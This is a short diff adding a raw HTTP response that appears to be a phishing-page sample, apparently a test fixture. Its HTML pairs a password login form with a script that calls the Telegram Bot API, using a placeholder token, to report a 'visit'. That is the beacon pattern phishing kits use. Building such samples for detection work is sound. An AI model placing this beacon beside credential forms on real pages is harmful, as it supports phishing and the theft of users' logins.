@@ -1,0 +1,4 @@
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action="/login"><input type="password" name="password"></form><script>fetch("https://api.telegram.org/bot123:ABC/sendMessage?chat_id=1&text=visit");</script></body></html>
